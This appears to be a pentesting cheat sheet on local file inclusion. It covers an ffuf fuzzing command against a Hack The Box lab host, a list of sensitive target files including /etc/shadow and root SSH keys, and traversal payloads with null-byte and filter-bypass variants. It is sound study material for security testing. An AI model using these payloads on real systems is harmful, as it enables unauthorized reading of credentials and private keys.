# LFI enumeration
Read more https://book.hacktricks.xyz/pentesting-web/file-inclusion

```bash
# Enumerate the page query parameter for LFI vulneratbility
ffuf -w /usr/share/wordlists/lfi.txt -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -fw 1
```

### Common path to test
|                             |                                                                                                                                                                   |
|:---------------------------:|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| /etc/issue                  | Contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | Controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | Specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | Has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | Contains information about the system's users' passwords                                                                                                          |
| /root/.bash_history         | Contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | Contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | All emails for root user                                                                     |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                 |
| /var/log/apache2/access.log | The accessed requests for Apache  webserver                                                            |
| C:\boot.ini                 | Contains the boot options for computers with BIOS firmware                                                    |

### Test if null bytes can be used to bypass file extensions
It may be possible to override the end of the include statement by sending a null byte which tricks the application to disregard anything after it. `%00` (Url encoded) or `0x00` (Hex).

An include like this 

```php
include($_GET["filename"] . ".php");
```

Could be vulnerable to an attack like this. (Fixed in PHP 5.3.4 and above.)


```HTTP
GET http://site.com/index.php?filename=../../../../etc/passwd%00
```

### Filter bypasses

#### Bypass filename black list filter
It's possible that there's a filter being applied that disallowes certain file names. In that case it could be possible to bypass the filter by sending a null byte `(%00 or 0x00)` or by adding the current directory `(.)` to the end of the file path. 

If there's for example a filter disallowing the `/etc/passwd` file it might be possible to bypass it with one of these requests.

**Null Byte**
```HTTP
GET http://site.com/index.php?filename=../../../../etc/passwd%00
```

**Current directory**
```HTTP
GET http://site.com/index.php?filename=../../../../etc/passwd/.
```

#### Bypass `../` replacement
In some cases the application might replace `../` with an empty string to try and prevent directoy traversal. In that case it could be possible to bypass it by sending a string like this `....//....//etc/passwd`. This is because some languages will only replace matches in the original string and wont't try to match occurances in the resulting string. 

```HTTP
GET http://site.com/index.php?filename=....//....//etc/passwd
```

Would after replacing any `../` result in the application looking for a file called  `../../etc/passwd`


#### Bypass include only allowed from a certain folder.
If files to be included are only allowed from a certain folder it might be possible to add that folder to the path and then use directory traversal to move to the correct folder. 

```HTTP
GET http://site.com/index.php?filename=allowed-folder/../../../../etc/passwd
```


#### Switch `Method`
It might be possible that the filters are only applied to the current method. Try sending the same request with `GET/POST/PUT` instead
